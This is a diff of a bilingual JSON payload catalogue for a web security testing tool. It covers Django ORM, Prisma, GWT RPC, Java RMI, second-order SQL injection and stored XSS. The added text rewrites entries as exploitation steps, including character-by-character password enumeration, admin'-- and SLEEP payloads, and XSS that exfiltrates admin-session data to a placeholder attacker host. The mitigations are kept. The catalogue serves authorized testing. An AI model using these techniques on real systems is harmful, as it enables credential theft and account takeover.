-          "zh": "Django ORM 会参数化字段值，但如果应用把请求键直接传给 filter(**request.data)，攻击者仍可控制字段名、双下划线 lookup 和关系路径。本条关注查询结构授权而非原始 SQL 拼接，验证时应比较结果基数、响应差异和 ORM 生成 SQL，并确认接口是否本来就允许高级筛选。",
-          "en": "Django ORM parameterizes values, yet applications that pass request keys directly into filter(**request.data) still let clients control field names, double-underscore lookups, and relation paths. This entry concerns authorization over query structure rather than raw SQL concatenation and compares result cardinality, responses, and generated SQL while checking whether advanced filtering is intentionally supported."
+          "zh": "覆盖 Django ORM Lookup 注入验证：把客户端 JSON 键展开为 ORM lookup，以 password__startswith 等谓词逐字符推断受保护字段。适用于 filter(**request.data) 类动态查询构造。",
+          "en": "Covers Django ORM lookup injection verification: expanding client JSON keys into ORM lookups and inferring protected fields character by character via predicates like password__startswith. Suitable for dynamic query construction such as filter(**request.data)."
         },
         "vulnerability": {
-          "zh": "服务端只校验 JSON 是对象，却没有固定可查询字段和 lookup，导致 password__startswith 等键被 ORM 解析为业务未授权的谓词。攻击者可通过布尔结果、计数或时间差逐字符推断敏感值。数据库参数化仍然有效，但它不能补偿查询字段和运算符层面的授权缺失。",
-          "en": "The server validates only that JSON is an object and does not fix allowed fields and lookups. Keys such as password__startswith become unauthorized predicates. An attacker can infer sensitive values through Boolean results, counts, or timing. Database parameterization still works, but it cannot compensate for missing authorization over fields and operators."
+          "zh": "根因是服务端只校验 JSON 是对象却未固定可查询字段与 lookup，password__startswith 等键被 ORM 解析为业务未授权谓词；数据库参数化仍然有效，但无法补偿字段与运算符层面的授权缺失。",
+          "en": "The root cause is servers validating only that JSON is an object without pinning queryable fields and lookups, letting keys like password__startswith be parsed by the ORM into unauthorized predicates; database parameterization still works but cannot compensate for missing field- and operator-level authorization."
         },
         "exploitation": {
-          "zh": "步骤一使用文档允许的 username 精确筛选记录正常结果与 SQL；步骤二每次提交一个原始 lookup，比较结果数量、状态码和数据库查询日志，避免批量猜测；步骤三使用无权限普通账号、随机前缀和管理员专用筛选接口作对照，排除合法高级查询、统一空结果或缓存响应造成的假阳性。",
-          "en": "Use a documented exact username filter and record normal results and generated SQL. Submit one original lookup at a time and compare result count, status, and database query logs without bulk guessing. Compare a low-privilege account, random prefixes, and an administrator-only search endpoint to exclude legitimate advanced filtering, uniform empty results, or cached responses as false positives."
+          "zh": "使用第 1 步命令对 password 字段逐字符提交 startswith/contains 查找注入；响应在命中与未命中字符间出现稳定差异即确认 ORM 查找表达式可注入并可逐位枚举。先用文档允许的 username 精确筛选记录正常结果与 SQL 基线，每次只提交一个 lookup 避免批量猜测。",
+          "en": "Use the step 1 command to submit startswith/contains lookup injections against the password field character by character; stable response differences between hit and miss characters confirm injectable ORM lookups enabling bit-by-bit enumeration. Baseline with the documented username exact filter recording normal results and SQL first, submitting one lookup per attempt to avoid bulk guessing."
         },
         "mitigation": {
-          "zh": "为每个端点定义固定的筛选 DTO，只映射允许字段和 lookup；禁止直接展开 request.data、query_params 或客户端 order_by；对敏感模型执行对象级授权和响应字段允许列表，统一无匹配响应，限制枚举速率并审计双下划线键与高频前缀查询。",
-          "en": "Define an endpoint-specific filtering DTO that maps only allowed fields and lookups. Never expand request.data, query_params, or client order_by directly. Enforce object-level authorization and response-field allowlists for sensitive models, normalize no-match responses, rate-limit enumeration, and audit double-underscore keys and high-frequency prefix queries."
+          "zh": "为每个端点定义固定筛选 DTO 只映射允许字段与 lookup，禁止直接展开 request.data/query_params 与客户端 order_by；敏感模型执行对象级授权，统一无匹配响应并审计双下划线键与高频前缀查询。",
+          "en": "Define fixed filter DTOs per endpoint mapping only allowed fields and lookups, forbidding direct expansion of request.data/query_params and client order_by; apply object-level authorization on sensitive models, unify no-match responses, and audit double-underscore keys and high-frequency prefix queries."
         },
         "difficulty": "intermediate"
       },
@@ -1679,20 +1679,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "关系字段查询本身是 Django ORM 的正常能力，风险来自 API 将模型关系图暴露给低权限客户端，却没有对可查询属性和返回属性执行独立授权。本条通过 profile、token 等关系前缀检查属性级数据泄露，并要求先确认测试账号对目标对象和字段的业务权限。",
-          "en": "Relationship filtering is a normal Django ORM feature. Risk arises when an API exposes the model relation graph to low-privilege clients without separate authorization for queryable and returned properties. This entry checks profile and token relation prefixes for property-level disclosure after confirming the test account's business permissions for the object and field."
+          "zh": "该 Payload 覆盖 Django ORM 关系字段越权查询场景，检验双下划线路径把关联对象字段纳入筛选的暴露面。验证维度为跨关系前缀匹配与结果差异的单步矩阵，对应第 1 步。",
+          "en": "This payload covers Django ORM relation-path over-querying, testing exposure when double-underscore paths filter across related object fields. Validation is a single-step matrix of cross-relation prefix matches and result differentials, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "应用把用户提供的关系路径传给 filter、exclude 或 order_by，ORM 会自动生成 JOIN 并对关联字段应用谓词。即使最终响应只返回布尔值或数量，攻击者也可通过多次查询推断电话、邮箱、令牌等敏感属性。对象级登录校验无法自动覆盖每个关系和属性。",
-          "en": "The application passes user-provided relation paths to filter, exclude, or order_by, and the ORM generates joins and predicates over related fields. Even when the response returns only a Boolean or count, repeated queries can infer phone numbers, email addresses, tokens, and other sensitive properties. Object-level login checks do not automatically authorize every relationship and property."
+          "zh": "根因在于查询参数直接进入 ORM 过滤器而未限定可过滤字段：攻击者用 profile 加字段路径探测关联数据，按结果差异逐位还原敏感值。",
+          "en": "The root cause is query parameters entering ORM filters without field restrictions: attackers probe related data via profile-plus-field paths, recovering sensitive values bit by bit from result differentials."
         },
         "exploitation": {
-          "zh": "先用普通用户查询其被允许的公开资料字段并记录结果；再逐个提交原始关系前缀，比较布尔结果、数量和生成 JOIN，同时关联访问控制日志；最后用资源所有者、管理员和完全无关用户三种主体复测，排除管理员设计权限、测试数据相同或通用搜索功能造成的假阳性。",
-          "en": "Query an allowed public profile field as a normal user and record the result. Submit original relationship prefixes individually, compare Boolean results, counts, and generated joins, and correlate authorization logs. Retest as the resource owner, an administrator, and an unrelated user to exclude intended administrator access, identical fixture data, or generic search behavior as false positives."
+          "zh": "第 1 步按脚本对目标用户名构造跨关系的前缀匹配查询并观察命中结果：关联字段可被筛选或差异可读即确认属性级越权，按前缀匹配逐步收缩还原具体值。成功判据以差异还原出的字段值为准。占位符在全局变量菜单替换；目标对象使用合成数据。",
+          "en": "In step 1, build cross-relation prefix-match queries against a target username per the script and observe hits; filterable related fields or readable differentials confirm attribute-level over-querying, narrowing prefix matches to recover concrete values. Judge success by field values recovered from differentials. Replace placeholders via the global variables menu; target objects use synthetic data."
         },
         "mitigation": {
-          "zh": "为每个角色定义可筛选关系与属性的允许列表，并在查询构造前执行对象和属性级授权；使用专用 Serializer/DTO 控制输出字段，不暴露模型内部路径；对敏感前缀查询进行限速与审计，采用一致响应减少枚举信号，并为跨租户关系建立回归测试。",
-          "en": "Define role-specific allowlists for filterable relationships and properties and enforce object and property authorization before query construction. Use dedicated serializers or DTOs to control output fields without exposing model paths. Rate-limit and audit sensitive prefix queries, normalize responses to reduce enumeration signals, and regression-test cross-tenant relationships."
+          "zh": "过滤器白名单限定可查询字段与关系深度，禁用客户端控制的 ORM 路径并统一走序列化层校验。修复后重放第 1 步，跨关系路径应被拒绝且无差异可读。",
+          "en": "Whitelist filterable fields and relation depth, forbidding client-controlled ORM paths and routing all queries through serializer-level checks. After the fix, replay step 1: cross-relation paths should be rejected with no readable differentials."
         },
         "difficulty": "advanced"
       },
@@ -1788,20 +1788,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Prisma Client 会安全参数化正常字段值，但它不会替应用决定哪些模型属性可由当前用户查询或返回。本条原始语料主要改变 select 字段，因此核心问题是 API 把查询形状所有权交给客户端，而非传统 SQL 拼接；验证应关注实际响应字段和调用者权限。",
-          "en": "Prisma Client parameterizes ordinary values, but it does not decide which model properties a current user may query or receive. The original corpus mainly changes select fields, so the issue is client ownership of query shape rather than classic SQL concatenation. Validation focuses on returned properties and caller authorization."
+          "zh": "该 Payload 覆盖 Prisma 查询对象属性越权场景，检验客户端 where 与 select 对象直传数据库层后的字段暴露。验证维度为敏感字段 select 与范围扩展的请求矩阵，对应第 1 步。",
+          "en": "This payload covers Prisma query-object over-selection, testing field exposure when client where and select objects pass straight to the database layer. Validation is a request matrix of sensitive-field selects and scope extensions, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "服务端将请求体中的 where/select/include 原样展开到 Prisma 查询，客户端即可请求 password、token、secret 等业务未授权属性，或借关系 include 扩大对象范围。ORM 的类型系统只保证字段存在和查询有效，不提供运行时用户、租户和属性级授权。",
-          "en": "The server spreads request where, select, or include objects directly into Prisma queries. Clients can request business-restricted properties such as password, token, or secret and expand object scope through relation includes. ORM types ensure fields exist and queries are valid; they do not enforce runtime user, tenant, or property authorization."
+          "zh": "根因在于服务端把客户端 JSON 直接作为 Prisma 查询参数：调用者自选敏感字段或扩大对象范围，属性级授权在查询层完全缺位。",
+          "en": "The root cause is server-side pass-through of client JSON as Prisma query arguments: callers choose sensitive fields themselves or widen object scope, with attribute-level authorization absent at the query layer."
         },
         "exploitation": {
-          "zh": "步骤一以普通账号请求文档允许的公开字段并保存响应 Schema；步骤二每次提交一个原始 select 变体，比较敏感字段是否出现并关联 API 授权和 Prisma 查询日志；步骤三用资源所有者、管理员和不存在对象作对照，排除角色预期权限、测试夹具暴露或 GraphQL 字段缓存造成的假阳性。",
-          "en": "Request documented public fields as an ordinary user and save the response schema. Submit one original select variant at a time, compare whether sensitive fields appear, and correlate API authorization and Prisma query logs. Compare the resource owner, an administrator, and a nonexistent object to exclude intended role permissions, exposed fixture data, or GraphQL field caching as false positives."
+          "zh": "第 1 步按脚本把 select 指向 password、令牌等敏感字段的查询逐条提交，记录响应字段：私有字段随响应返回即确认查询形状未约束，再以 include 扩展关联对象复测深度。成功判据以响应字段矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, submit queries selecting sensitive fields such as passwords and tokens one by one per the script, recording response fields; private fields returning confirm unconstrained query shapes, then extend related objects via include to retest depth. Judge success by the response-field matrix. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "由服务端为每个用例固定 Prisma 查询形状，不接受任意 select/include；在进入 ORM 前执行租户、对象和属性级授权，并通过 DTO 明确允许输出的字段；禁止把密码和令牌列返回应用层，审计敏感字段选择，给跨角色和跨租户查询建立自动化测试。",
-          "en": "Own each Prisma query shape on the server and reject arbitrary select or include objects. Enforce tenant, object, and property authorization before the ORM and expose fields through explicit DTOs. Avoid returning password and token columns to the application layer, audit sensitive selections, and automate cross-role and cross-tenant query tests."
+          "zh": "查询形状由服务端固定模板生成，客户端仅传标量参数；select 与 include 完全收归服务端控制。修复后重放第 1 步，敏感字段应永不出现在响应中。",
+          "en": "Generate query shapes from fixed server templates with clients passing scalar parameters only, keeping select and include fully server-controlled. After the fix, replay step 1: sensitive fields should never appear in responses."
         },
         "difficulty": "intermediate"
       },
@@ -1897,20 +1897,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "端点字典只能用于建立候选攻击面，路径返回 200、302 或统一 HTML 并不等于存在 GWT RPC 服务。本条强调先以随机路径识别 SPA fallback、CDN 和自定义错误页，再根据 Content-Type、响应结构、GWT 模块资源和服务端日志确认真实 RPC 处理器。",
-          "en": "An endpoint wordlist only identifies candidates. A 200, 302, or generic HTML response does not prove a GWT RPC service. First characterize random-path SPA fallbacks, CDNs, and custom error pages, then confirm a real RPC handler through content type, response structure, GWT module assets, and server logs."
+          "zh": "该 Payload 覆盖 GWT RPC 端点暴露面发现场景，检验遗留远程服务路径的存活与独立鉴权状态。验证维度为常见 GWT 与 RPC 路径的探测矩阵，对应第 1 步。",
+          "en": "This payload covers GWT RPC endpoint exposure discovery, testing whether legacy remote-service paths remain live and independently authenticated. Validation is a probing matrix of common GWT and RPC paths, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "GWT RPC 服务若保留废弃方法、依赖客户端隐藏入口或只在页面层校验权限，攻击者可直接调用服务端方法。真正风险来自方法级认证授权、序列化策略和输入验证缺失，而不是使用 GWT 技术本身；仅发现 `/gwt` 或 `/rpc` 路径不能构成漏洞。",
-          "en": "GWT RPC services may expose deprecated methods, rely on client-hidden routes, or enforce authorization only in the page layer, allowing direct server-method calls. Risk comes from missing method authentication, authorization, serialization policy, and input validation, not from GWT itself. Finding `/gwt` or `/rpc` alone is not a vulnerability."
+          "zh": "根因在于遗留 RPC 服务未随前端下线而退役且常绕过主站鉴权链：可达端点接受序列化调用即可执行业务方法，形成隐蔽攻击面。",
+          "en": "The root cause is legacy RPC services never retired with the frontend and often bypassing main-site authentication chains: reachable endpoints accepting serialized invocations execute business methods, forming a covert attack surface."
         },
         "exploitation": {
-          "zh": "步骤一请求随机不存在路径和站点首页，记录状态、长度、重定向和缓存头；步骤二低速遍历原始路径集合，检查 GWT 模块脚本、RPC Content-Type、序列化错误和服务端路由日志；步骤三对确认端点发送无副作用且格式正确的未认证/已认证请求，排除 SPA fallback、反向代理统一页、目录重写或蜜罐造成的假阳性。",
-          "en": "Request a random nonexistent path and the site root, recording status, length, redirects, and cache headers. Traverse the original path corpus at low rate and inspect GWT module scripts, RPC content types, serialization errors, and route logs. For confirmed endpoints, send side-effect-free well-formed unauthenticated and authenticated requests to exclude SPA fallbacks, proxy-generated pages, rewrites, or honeypots as false positives."
+          "zh": "第 1 步按脚本逐条探测 GWT 与 RPC 路径并记录响应特征：返回 RPC 框架错误或服务描述即确认端点存活，再以未认证请求调用验证独立鉴权是否缺失。成功判据以存活端点清单为准。占位符在全局变量菜单替换；对存活端点仅做只读调用。",
+          "en": "In step 1, probe GWT and RPC paths one by one per the script, recording response signatures; RPC framework errors or service descriptions confirm live endpoints, then call unauthenticated to verify whether independent authorization exists. Judge success by the live-endpoint inventory. Replace placeholders via the global variables menu; make read-only calls only against live endpoints."
         },
         "mitigation": {
-          "zh": "维护 RPC 方法清单并删除废弃服务；在每个远程方法中执行服务端认证、对象授权和输入 Schema 校验，不依赖客户端模块隐藏；限制可反序列化类型和请求大小，在网关实施速率限制与访问日志，并对未知方法和策略不匹配建立告警。",
-          "en": "Maintain an RPC method inventory and remove deprecated services. Enforce server-side authentication, object authorization, and input schemas in every remote method rather than relying on hidden client modules. Restrict deserializable types and request size, apply gateway rate limits and access logs, and alert on unknown methods and serialization-policy mismatches."
+          "zh": "退役未使用的 RPC 服务并按主站同一鉴权中间件覆盖全部路径，对框架特征响应做统一 404。修复后重放第 1 步，探测应无任何特征响应。",
+          "en": "Retire unused RPC services, cover every path with the main site's authentication middleware, and normalize framework-signature responses to 404. After the fix, replay step 1: probing should surface no signature responses."
         },
         "difficulty": "intermediate"
       },
@@ -2006,20 +2006,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "端口开放只说明存在 TCP 监听者，1099 也可能被其他产品占用；RMI Registry 的存在同样不自动等于可利用。本条把端口集合用于初筛，随后必须确认 JRMI 协议、Registry 列表权限、远程对象接口以及 JVM 序列化过滤器，才能形成有效安全结论。",
-          "en": "An open port proves only that a TCP listener exists, and 1099 may belong to another product. An RMI Registry is not automatically exploitable. This entry uses the port corpus for triage and then requires JRMI identification, registry-list permissions, remote-object interfaces, and JVM serialization-filter state before drawing a security conclusion."
+          "zh": "该 Payload 覆盖 Java RMI 服务暴露面验证场景，检验 Registry 端口段的监听、对象暴露与访问控制。验证维度为常见 RMI 端口段的探测与握手特征识别，对应第 1 步。",
+          "en": "This payload covers Java RMI service exposure validation, testing registry port listening, object exposure and access control. Validation probes the common RMI port range and identifies handshake signatures, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "RMI 将方法调用和对象参数跨网络传输；若 Registry 或远程对象绑定到不受信任网段、缺少主体认证和方法授权，或接受未过滤的序列化参数，攻击者可能枚举服务、调用敏感方法或触发反序列化风险。默认端口和技术指纹本身不是漏洞。",
-          "en": "RMI transports method calls and object parameters across the network. If a Registry or remote object binds to untrusted networks, lacks principal authentication and method authorization, or accepts unfiltered serialized arguments, callers may enumerate services, invoke sensitive methods, or reach deserialization risk. The default port and protocol fingerprint alone are not vulnerabilities."
+          "zh": "根因在于 RMI Registry 默认无认证且常暴露于业务网段：可达端口返回挑战握手即可枚举远程对象，反序列化过滤缺失时直接升级为代码执行。",
+          "en": "The root cause is RMI Registry's default lack of authentication plus exposure on business network segments: reachable ports return challenge handshakes enabling object enumeration, escalating to code execution when deserialization filtering is missing."
         },
         "exploitation": {
-          "zh": "先对一个确认关闭端口和一个已知普通 TCP 服务记录连接基线；再按限定速率扫描原始端口集合，检查 JRMI 魔数、握手和服务端网络日志；最后仅对确认 Registry 执行无副作用列表请求并比较未认证与授权账号，排除端口复用、负载均衡健康检查、防火墙伪响应或仅有握手无远程对象造成的假阳性。",
-          "en": "Record connection baselines for a known closed port and an ordinary TCP service. Scan the original port corpus at a bounded rate and inspect JRMI magic, handshakes, and server network logs. Only for a confirmed Registry, issue a side-effect-free list request and compare unauthenticated and authorized identities to exclude port reuse, load-balancer health checks, firewall deception, or a handshake with no exposed objects as false positives."
+          "zh": "第 1 步按脚本对常见 RMI 端口段发起连接并识别挑战或握手响应，命中端口后记录监听主机与对象绑定信息；再以未授权客户端尝试列出绑定对象验证访问控制。成功判据以存活端口与对象清单为准。占位符在全局变量菜单替换；探测范围限定授权网段。",
+          "en": "In step 1, connect across the common RMI port range per the script and identify challenge or handshake responses; on hits, record listening hosts and bound objects, then attempt unauthenticated object listing to verify access control. Judge success by live ports and the object inventory. Replace placeholders via the global variables menu; confine probing to authorized segments."
         },
         "mitigation": {
-          "zh": "将 Registry 和远程对象绑定到管理网或回环接口，并用防火墙限制来源；为远程方法实施强身份认证、对象和方法级授权及传输加密；启用 JEP 290 序列化过滤、升级 JDK 和依赖，删除不需要的绑定，并审计 Registry 枚举、失败调用和异常类解析。",
-          "en": "Bind Registries and remote objects to management networks or loopback and restrict sources with firewalls. Enforce strong authentication, object and method authorization, and transport protection for remote calls. Enable JEP 290 serialization filters, update the JDK and dependencies, remove unused bindings, and audit registry enumeration, failed calls, and unusual class resolution."
+          "zh": "RMI 服务绑定内网管理段并启用 SSL 与调用方认证，升级 JDK 反序列化过滤，对 Registry 访问做网络白名单。修复后重放第 1 步，目标网段应无握手响应。",
+          "en": "Bind RMI services to internal management segments with SSL and caller authentication, apply JDK deserialization filters, and network-whitelist Registry access. After the fix, replay step 1: target segments should show no handshake responses."
         },
         "difficulty": "intermediate"
       },
@@ -2115,20 +2115,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "二阶 SQL 注入的输入点和执行点不在同一请求：注册或资料编辑只负责存储，后续读取流程才把该值拼进新查询。本条审校必须画出写入、持久化、读取和 SQL Sink 的完整链路，并通过数据库审计把触发请求与原始存储值关联，不能只测试首次写入响应。",
-          "en": "In second-order SQL injection, input and execution occur in different requests. Registration or profile editing stores a value, while a later read path concatenates it into another query. This review maps write, persistence, read, and SQL sink stages and correlates the trigger request with the stored value through database audit logs instead of testing only the initial response."
+          "zh": "覆盖二阶（存储型）SQL 注入的存储到触发验证：注册或资料字段保存 admin'--、恒真、UNION 与 SLEEP/WAITFOR 变体，后续登录或查询路径触发执行。输入点与执行点分离是该类漏洞的核心特征。",
+          "en": "Covers stored-to-trigger verification of second-order SQL injection: saving admin'--, always-true, UNION, and SLEEP/WAITFOR variants via registration or profile fields, then triggering execution on later login or query paths. Separation of input and execution points is the defining trait."
         },
         "vulnerability": {
-          "zh": "开发者可能在入口使用参数化 INSERT，却错误地把数据库中已有值视为可信，在后续 SELECT、动态表名、排序或存储过程中进行字符串拼接。持久化不会净化数据；只要第二个 Sink 不参数化，带引号、注释或时间函数的内容就会在新的 SQL 上下文恢复语义。",
-          "en": "Developers may parameterize the initial INSERT but later trust database-resident values and concatenate them into SELECT statements, dynamic identifiers, sorting, or stored procedures. Persistence does not sanitize data. If the second sink is not parameterized, quotes, comments, or timing functions regain meaning in the new SQL context."
+          "zh": "根因是入口参数化 INSERT 后，开发者把数据库已有值视为可信并在后续 SELECT、动态表名、排序或存储过程中拼接；持久化不会净化数据，第二个 Sink 不参数化时带引号与注释的内容恢复 SQL 语义。",
+          "en": "The root cause is developers parameterizing entry INSERTs while treating existing database values as trusted, concatenating them into later SELECTs, dynamic table names, ordering, or stored procedures; persistence sanitizes nothing, and quoted or commented content regains SQL semantics at any non-parameterized second sink."
         },
         "exploitation": {
-          "zh": "步骤一创建带随机安全标记的测试账号并记录注册、登录和数据库查询；步骤二存入原始集合中的单一值，再触发登录、报表或后台读取，比较错误、时间和审计 SQL；步骤三更换随机标记、跳过触发流程并清理连接池缓存，排除用户名冲突、锁定策略、慢查询抖动或入口 WAF 响应造成的假阳性，测试后删除数据。",
-          "en": "Create a test account with a random safe marker and record registration, login, and database queries. Store one original value and trigger login, reporting, or a background read, comparing errors, timing, and audited SQL. Change the random marker, skip the trigger path, and clear connection-pool caches to exclude username collisions, lockout policy, query jitter, or entry-point WAF responses as false positives, then delete test data."
+          "zh": "使用第 1 步命令先以注册/存储字段保存 admin'-- 与恒真、UNION、SLEEP/WAITFOR 变体，再触发登录或查询路径；后续查询行为改变（认证绕过、延迟约 3 秒或回显数据）即确认二阶注入成立。用带随机标记的测试账号记录写入、触发与审计 SQL 的完整链路，测试后删除数据。",
+          "en": "Use the step 1 command to first save admin'--, always-true, UNION, and SLEEP/WAITFOR variants via registration or profile fields, then trigger login or query paths; changed downstream query behavior (auth bypass, roughly three-second delay, or echoed data) confirms second-order injection. Record the full write-trigger-audit chain with a randomized-marker test account and delete data afterward."
         },
         "mitigation": {
-          "zh": "对每一个 SQL Sink 参数化，包括来自数据库、消息和缓存的二次输入；动态标识符必须通过固定映射而非字符串拼接；建立覆盖写入到读取全流程的回归测试，收紧数据库账号权限，统一错误响应，并监控异常注释、时间函数和跨请求关联的查询失败。",
-          "en": "Parameterize every SQL sink, including values read from databases, messages, and caches. Map dynamic identifiers through fixed server-side choices rather than concatenation. Add write-to-read regression tests, reduce database privileges, normalize errors, and monitor unusual comments, timing functions, and query failures correlated across requests."
+          "zh": "对每一个 SQL Sink 参数化，包括来自数据库、消息与缓存的二次输入；动态标识符走固定映射；建立覆盖写入到读取全流程的回归测试，统一错误响应并监控异常注释与时间函数。",
+          "en": "Parameterize every SQL sink, including second-hand inputs from databases, messages, and caches; map dynamic identifiers through fixed mappings; build regression tests covering the full write-to-read flow, unify error responses, and monitor abnormal comments and time functions."
         },
         "difficulty": "advanced"
       },
@@ -2224,20 +2224,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "存储型 XSS 涉及写入者、持久化层和查看者三个主体，危险常出现在后台富文本、审核队列或通知模板，而不是提交页面。本条审校要求使用隔离的测试管理员浏览器，把数据库中的原始值、最终 DOM、CSP 报告和网络请求关联起来，并避免使用真实会话或敏感 Cookie。",
-          "en": "Stored XSS involves the writer, persistence layer, and viewer, and the dangerous sink often appears in administrative rich text, review queues, or notification templates rather than the submission page. Use an isolated test-administrator browser and correlate the stored value, final DOM, CSP reports, and network requests without exposing real sessions or sensitive cookies."
+          "zh": "覆盖存储型 XSS 在高权限查看页的触发验证：评论、资料或工单内容持久化后，在管理员等高权限用户查看时未经编码进入可执行位置。写入者、持久化层与查看者三主体是验证关键。",
+          "en": "Covers stored XSS triggering in high-privilege views: comments, profiles, or tickets persisted, then entering executable positions unencoded when administrators or other privileged users view them. The writer-persistence-viewer triad is the verification key."
         },
         "vulnerability": {
-          "zh": "应用在写入时保留 HTML 或事件属性，却在高权限页面按 innerHTML、模板非转义输出或危险 URL 上下文渲染。输入跨越存储边界后被误认为可信，浏览器最终把脚本、事件处理器或 javascript: URL 当作代码执行；入口过滤不能替代每个输出上下文的编码。",
-          "en": "The application preserves HTML or event attributes and later renders them in a privileged page through innerHTML, unescaped templates, or dangerous URL contexts. Input is treated as trusted after storage, and the browser executes scripts, event handlers, or javascript: URLs. Entry filtering cannot replace encoding for every output context."
+          "zh": "根因是应用写入时保留 HTML 或事件属性，高权限页面按 innerHTML、模板非转义输出或危险 URL 上下文渲染；输入跨存储边界后被误认为可信，入口过滤不能替代输出上下文编码。",
+          "en": "The root cause is applications preserving HTML or event attributes at write time while high-privilege pages render via innerHTML, unescaped template output, or hazardous URL contexts; input crossing the storage boundary is mistakenly trusted, and entry filtering cannot replace output-context encoding."
         },
         "exploitation": {
-          "zh": "步骤一写入随机纯文本标记并确认数据库值与管理页面 DOM；步骤二使用本条原始集合中的一个无害回调变体，在隔离浏览器打开目标视图，观察 DOM、CSP 报告和自有测试端点请求；步骤三禁用扩展、清缓存并比较已编码文本和不同角色视图，排除浏览器插件、开发脚本、旧缓存或反射型 XSS 造成的假阳性，随后删除测试记录。",
-          "en": "Store a random plain-text marker and confirm both the database value and administrative DOM. Use one harmless callback variant from the original corpus and open the target view in an isolated browser, observing the DOM, CSP reports, and requests to an owned test endpoint. Disable extensions, clear caches, and compare encoded text and different roles to exclude browser add-ons, development scripts, stale cache, or reflected XSS as false positives, then delete the record."
+          "zh": "使用第 1 步命令把外发与事件载荷注入评论等存储点，等待管理员查看触发；管理员会话执行后 {ATTACKER_HOST} 收到数据或弹出标记即确认高权限查看页存储型 XSS 成立。先用随机纯文本标记确认数据库值与管理页 DOM，再在隔离管理员浏览器观察执行与 CSP 报告，避免使用真实会话。",
+          "en": "Use the step 1 command to inject exfiltration and event payloads into storage points like comments, then wait for an administrator view to trigger; data reaching {ATTACKER_HOST} or a popup flag under the admin session confirms stored XSS in the high-privilege view. Confirm the database value and admin-page DOM with a random plain-text marker first, then observe execution and CSP reports in an isolated admin browser without touching real sessions."
         },
         "mitigation": {
-          "zh": "按 HTML 文本、属性、URL 和 JavaScript 上下文分别编码输出；确需富文本时使用维护中的消毒器和最小标签/属性允许列表，禁止危险 DOM API；部署基于 nonce/hash 的严格 CSP，给会话 Cookie 设置 HttpOnly/SameSite，并覆盖所有后台、导出和通知 Sink 的回归测试。",
-          "en": "Encode output separately for HTML text, attributes, URLs, and JavaScript contexts. When rich text is required, use a maintained sanitizer with a minimal tag and attribute allowlist and avoid dangerous DOM APIs. Deploy a strict nonce- or hash-based CSP, set HttpOnly and SameSite on session cookies, and regression-test every administrative, export, and notification sink."
+          "zh": "按 HTML 文本、属性、URL 与 JS 上下文分别编码输出，富文本走维护中消毒器与最小允许列表，部署 nonce/hash CSP 并给会话 Cookie 设置 HttpOnly/SameSite；回归覆盖所有后台、导出与通知 Sink。",
+          "en": "Encode output per HTML text, attribute, URL, and JS contexts, run rich text through maintained sanitizers with minimal allowlists, deploy nonce/hash CSP with HttpOnly/SameSite session cookies; regression must cover every admin, export, and notification sink."
         },
         "difficulty": "advanced"
       },
